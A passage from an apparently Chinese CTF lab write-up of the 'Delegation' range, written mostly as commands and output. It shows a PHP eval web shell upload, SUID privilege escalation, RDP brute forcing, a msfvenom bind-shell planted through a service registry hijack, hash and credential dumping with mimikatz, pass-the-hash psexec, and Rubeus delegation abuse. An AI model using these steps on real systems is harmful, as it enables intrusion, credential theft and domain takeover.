PHPSESSID=vtencsmrhhid57f4pqk7dtio6u; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_2.php&amp;slen=693&amp;scontent=&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;test&quot;</span>]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/7.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/8.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/9.png"></p><p>原来垃圾校园网的问题！！！淦</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/10.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/11.png"></p><p>蚁剑连上后得知是linux</p><p>cat flag没权限</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>那么接下来就是内核、suid、sudo等了</p><p>这里不用内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/12.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure><p>这里我们就用&#x2F;usr&#x2F;bin&#x2F;diff</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/13.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/var/www/html$  diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br><span class="line">  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     </span><br><span class="line"> |  _<span class="string">&quot;\ \| ___&quot;</span>|/ |<span class="string">&quot;|    \| ___&quot;</span>|/U /<span class="string">&quot;___|uU  /&quot;</span>\  u  |_ <span class="string">&quot; _|     ___     \/&quot;</span>_ \/ | \ |<span class="string">&quot;|    </span></span><br><span class="line"><span class="string">/| | | | |  _|&quot;</span> U | | u   |  _|<span class="string">&quot;  \| |  _ / \/ _ \/     | |      |_&quot;</span>_|    | | | |&lt;|  \| |&gt;   </span><br><span class="line">U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   </span><br><span class="line"> |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    </span><br><span class="line">  |||_   &lt;&lt;   &gt;&gt;  //  \\  &lt;&lt;   &gt;&gt;   _)(|_   \\    &gt;&gt;  _// \\_.-,_|___|_,-.  \\    ||   \\,-. </span><br><span class="line"> (__)_) (__) (__)(_<span class="string">&quot;)(&quot;</span>_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-<span class="string">&#x27; &#x27;</span>-(_/  (__)   (_<span class="string">&quot;)  (_/  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag01: flag&#123;e3a1c8e2-1db5-4a47-997f-28414f2a5460&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Great job!!!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here is the hint: WIN19\Adrian</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;ll do whatever I can to rock you...</span></span><br></pre></td></tr></table></figure><p>获取flag1</p><h2 id="flag02–RDP爆破密码喷洒"><a href="#flag02–RDP爆破密码喷洒" class="headerlink" title="flag02–RDP爆破密码喷洒"></a>flag02–RDP爆破密码喷洒</h2><p>接下来信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/var/www/html$ ./fscan -h 172.22.4.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.7      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.19     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.45     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.36     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.4.19:139 open</span></span><br><span class="line"><span class="string">172.22.4.7:139 open</span></span><br><span class="line"><span class="string">172.22.4.45:135 open</span></span><br><span class="line"><span class="string">172.22.4.19:135 open</span></span><br><span class="line"><span class="string">172.22.4.7:135 open</span></span><br><span class="line"><span class="string">172.22.4.7:88 open</span></span><br><span class="line"><span class="string">172.22.4.45:80 open</span></span><br><span class="line"><span class="string">172.22.4.36:80 open</span></span><br><span class="line"><span class="string">172.22.4.36:3306 open</span></span><br><span class="line"><span class="string">172.22.4.45:445 open</span></span><br><span class="line"><span class="string">172.22.4.7:445 open</span></span><br><span class="line"><span class="string">172.22.4.19:445 open</span></span><br><span class="line"><span class="string">172.22.4.45:139 open</span></span><br><span class="line"><span class="string">172.22.4.36:22 open</span></span><br><span class="line"><span class="string">172.22.4.36:21 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 15</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.4.7</span></span><br><span class="line"><span class="string">   [-&gt;]DC01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.4.7</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.4.19</span></span><br><span class="line"><span class="string">   [-&gt;]FILESERVER</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.4.19</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.4.45</span></span><br><span class="line"><span class="string">   [-&gt;]WIN19</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.4.45</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span></span><br><span class="line"><span class="string">[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.4.36        code:200 len:68063  title:中文网页标题</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span></span><br></pre></td></tr></table></figure><p>这里我是用的苏神的vshell直接挂载代理了就不重复了</p><p>（第二次打我用stowaway重新搭建了隧道，具体可以看之前我Brute4road那篇）</p><p>整理一下资产</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.45     XIAORANG\WIN19</span><br><span class="line">172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter</span><br><span class="line">172.22.4.19   FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">172.22.4.36   跳板机 已拿下</span><br></pre></td></tr></table></figure><p>前面的提示也显示出要打XIAORANG\WIN19  （也就是45）</p><p>已知用户名进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra 172.22.4.45 rdp -l Adrian -P rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/14.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Strict chain  ...  193.134.210.161:1081 [proxychains] Strict chain  ...  193.134.210.161:1081 [proxychains] Strict chain  ...  193.134.210.161:1081  ...  172.22.4.45:3389  ...  172.22.4.45:3389  ...  172.22.4.45:3389 [3389][rdp] host: 172.22.4.45   login: Adrian   password: babygirl</span><br></pre></td></tr></table></figure><p>爆破成功</p><p>这里建议用kali连，因为需要改密码</p><p>用kali可以直接弹桌面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure><p>修改密码为1qaz@WSX</p><p>连接成功</p><p>桌面上直接就有 privesccheck 提权脚本扫描结果</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/15.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/16.png"></p><p>直接获取flag文件没成功</p><p>那我们就需要<strong>提权</strong></p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>正常是先获取一个shell（本地kali监听完后直接运行木马就可以了）</p><p>但这里我们可以直接使用启动项提权（我们拥有修改注册表的权限）</p><p>由于目标不出网，所以需要正向连接</p><p>这里使用vshell的木马没成功</p><p>那么我们尝试使用其他的</p><p>试试msf的</p><p>先生成木马</p><p>在kali本地机中生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=3344 -f exe &gt; aaa.exe</span><br></pre></td></tr></table></figure><p>直接cmd</p><p>修改注册表中的启动项为我们的恶意木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Users\Adrian\Desktop\aaa.exe&quot;</span> /f</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 172.22.4.45</span><br><span class="line"><span class="built_in">set</span> lport 3344</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/17.png"></p><p>这边run完，就在rdp执行下面的命令</p><p>启动一下服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/18.png"></p><p>然后shell就弹回来了</p><p>但是要尽快进程迁移，不然一下就断了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps     <span class="comment">#查看进程</span></span><br><span class="line"></span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/19.png"></p><p>选一个同为system的</p><p>获取flag02</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cat</span> /users/Administrator/flag/flag02.txt</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line"> ________  _______   ___       _______   ________  ________  _________  ___  ________  ________      </span><br><span class="line">|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \    </span><br><span class="line">\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \   </span><br><span class="line"> \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \  </span><br><span class="line">  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \ </span><br><span class="line">   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\</span><br><span class="line">    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag02: flag&#123;d7ff695a-b34a-448c-957d-126f95e340c5&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="flag03、04——非约束性委派"><a href="#flag03、04——非约束性委派" class="headerlink" title="flag03、04——非约束性委派"></a>flag03、04——非约束性委派</h2><p>再整理一下，已拿下两台主机</p><p>接下来可以尝试获取DC的权限了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.45     XIAORANG\WIN19   已拿下</span><br><span class="line">172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter</span><br><span class="line">172.22.4.19   FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">172.22.4.36   本机 已拿下</span><br></pre></td></tr></table></figure><p>我们先来dump一下系统中的用户的hash</p><p>这里获取到了administrator的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这些命令也是在msf运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi 加载mimikatz</span><br><span class="line">cred_all 导出所有Hash</span><br></pre></td></tr></table></figure><p>这里也可以看见WIN19$是本机的机器用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain    NTLM                              SHA1</span><br><span class="line">--------  ------    ----                              ----</span><br><span class="line">Adrian    WIN19     161cff084477fe596a5db81874498a24  d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br><span class="line">WIN19$    XIAORANG  dbee1706b84bb6f5ed05e5b7c0a8e86a  cd8ce51655a9222089cb82e3d77f572974d5faea</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain    Password</span><br><span class="line">--------  ------    --------</span><br><span class="line">(null)    (null)    (null)</span><br><span class="line">Adrian    WIN19     (null)</span><br><span class="line">WIN19$    XIAORANG  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain        Password</span><br><span class="line">--------  ------        --------</span><br><span class="line">(null)    (null)        (null)</span><br><span class="line">Adrian    WIN19         (null)</span><br><span class="line">WIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d 90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 59 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 8</span><br><span class="line">                        4 35 8a 0c 2e 9f d1 90 0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d <span class="built_in">df</span> 3f 33 f5 16 e4 ee 2e d3 88 92 <span class="built_in">cd</span> a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 53 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1</span><br><span class="line">                         0e 6b 64 a7 <span class="built_in">fc</span> 7a 2a a5 0e e0 b0 66 a9 a0 2f 8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 <span class="built_in">cd</span> a0 cc 5b f4 0e a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e1 d0 1f</span><br><span class="line">WIN19$    xiaorang.lab  c8 4e c4 16 11 96 8c 11 40 c8 26 8e 38 4f c2 d3 4e a9 48 02 77 6a a8 d2 0c 51 0f 86 d7 c1 95 7c a1 32 d0 12 e5 e7 6b 5e e0 63 a4 7e ba d4 a6 33 81 3e 77 f5 d9 8e 53 52 c2 39 54 e2 13 8f 7a 68 22 f3 c4 51 05 d7 c3 c0 3c e1 9d 72 6b 82 d2 10 af f</span><br><span class="line">                        5 28 70 d7 3d 37 b7 7a 34 2b f2 57 d7 25 38 a4 5d 46 b5 bd 16 da 51 f9 29 4b 34 5b fa e4 6b 3b 62 30 4d a3 d3 a6 5b 04 9a ab a5 89 bc e6 bc 99 2c fb c7 8d ef f6 db 1a f6 60 a4 bb 84 bc 80 0a e8 5b e2 2c 20 85 8d b0 91 e1 b0 00 80 06 00 32 fb 66</span><br><span class="line">                         eb 31 d9 1a a9 b0 2b d1 da 3a 39 78 53 11 1b 7b 6b 0f f7 7f 3d 33 51 98 fd ba 9d 36 19 a5 c5 7e 19 78 d0 2b f6 e1 31 d3 0c 17 03 91 d2 44 46 25 56 04 cb ac 58 1b 6e 65 69 20 fa 25 e0 93 d5 d3 a1 2a ae 30 65 f9 11 95 cc 11 d5 8b 58</span><br><span class="line">win19$    XIAORANG.LAB  c8 4e c4 16 11 96 8c 11 40 c8 26 8e 38 4f c2 d3 4e a9 48 02 77 6a a8 d2 0c 51 0f 86 d7 c1 95 7c a1 32 d0 12 e5 e7 6b 5e e0 63 a4 7e ba d4 a6 33 81 3e 77 f5 d9 8e 53 52 c2 39 54 e2 13 8f 7a 68 22 f3 c4 51 05 d7 c3 c0 3c e1 9d 72 6b 82 d2 10 af f</span><br><span class="line">                        5 28 70 d7 3d 37 b7 7a 34 2b f2 57 d7 25 38 a4 5d 46 b5 bd 16 da 51 f9 29 4b 34 5b fa e4 6b 3b 62 30 4d a3 d3 a6 5b 04 9a ab a5 89 bc e6 bc 99 2c fb c7 8d ef f6 db 1a f6 60 a4 bb 84 bc 80 0a e8 5b e2 2c 20 85 8d b0 91 e1 b0 00 80 06 00 32 fb 66</span><br><span class="line">                         eb 31 d9 1a a9 b0 2b d1 da 3a 39 78 53 11 1b 7b 6b 0f f7 7f 3d 33 51 98 fd ba 9d 36 19 a5 c5 7e 19 78 d0 2b f6 e1 31 d3 0c 17 03 91 d2 44 46 25 56 04 cb ac 58 1b 6e 65 69 20 fa 25 e0 93 d5 d3 a1 2a ae 30 65 f9 11 95 cc 11 d5 8b 58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来使用工具进行横向，发现都没成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/20.png"></p><p>那就测一下是否存在委派</p><p>接下来的操作需要执行该软件的用户在域内，也就是system的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域中配置非约束性委派的主机</span></span><br><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域中配置非约束性委派的服务账户</span></span><br><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br></pre></td></tr></table></figure><p>这里用套件直接获取system权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py Administrator@172.22.4.45  -hashes 00000000000000000000000000000000:ba21c629d9fd56aff10c3e826323e6ab -codec gbk</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/21.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/22.png"></p><p>可以看见在域内,运行这条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者使用套件中的进行查询，套件的<span class="built_in">hash</span>为机器用户的<span class="built_in">hash</span></span><br><span class="line">proxychains4 impacket-findDelegation xiaorang.lab/<span class="string">&#x27;WIN19$&#x27;</span> -hashes :dbee1706b84bb6f5ed05e5b7c0a8e86a -dc-ip 172.22.4.7</span><br></pre></td></tr></table></figure><p>这里查到为非约束委派</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/23.png"></p><p>这里创个账号</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/24.png"></p><p>添加个用户</p><p>RDP连接后传adfind、mimikatz</p><p>其实随便传个用户的桌面上就好</p><p>这个rdp建议用win，好直接拉</p><p>然后就是再次抓取密码，以确定哪个是机器用户的hash</p><p>这里忘截图了，可以去看看Brute4road的那份wp，周报有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line"><span class="built_in">log</span> 1.txt  <span class="comment">#将hash记录在1.txt，方便查找</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来的操作就是进行委派攻击了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ba21c629d9fd56aff10c3e826323e6ab</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbee1706b84bb6f5ed05e5b7c0a8e86a</span><br></pre></td></tr></table></figure><p>这个可以直接在本地管理员运行就可以了，但我这里直接也用system了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>这里劫持着</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 